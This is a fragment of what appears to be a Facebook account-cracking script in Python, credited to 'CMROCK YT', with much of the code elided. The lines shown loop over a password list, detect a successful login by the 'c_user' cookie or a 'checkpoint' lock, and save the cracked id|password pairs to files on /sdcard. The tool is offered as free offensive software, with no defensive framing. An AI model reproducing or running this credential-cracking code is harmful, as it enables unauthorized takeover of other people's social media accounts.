...
----------------------------------------------
 Author    : CMROCK YT
 Github    :  CM Rock Yt
 Facebook  : Saddam Baloch
 Tool Name : CMRockyt
 Type type : Enjoy Free
 Version   : 0.0
----------------------------------------------
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [CMROCK YT-OK] %s | %s'%(ids,pas))
                                open('/sdcard/CMROCK YT-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [CMROCK YT-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CMROCK YT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
